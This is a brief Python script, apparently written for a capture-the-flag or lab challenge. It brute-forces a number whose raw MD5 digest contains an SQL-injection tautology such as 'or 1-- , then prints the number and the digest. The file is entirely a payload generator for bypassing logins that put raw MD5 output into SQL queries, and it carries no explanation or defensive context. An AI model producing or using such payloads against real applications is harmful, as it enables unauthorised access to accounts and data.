import hashlib
import re

def get_md5_of_string(input_string):
    return hashlib.md5(input_string.encode()).digest()

pattern = re.compile(br"'(?:OR|or|oR|Or|''|\|\|) \d+(?:-- |#)")

temp = str(0)
flag = True
while flag:
    password_hash = get_md5_of_string(temp)
    if pattern.search((password_hash)):
        flag = False  # Stop the loop when a match is found
        print(temp)
        print(password_hash)
    else:
        temp = str(int(temp) + 1)
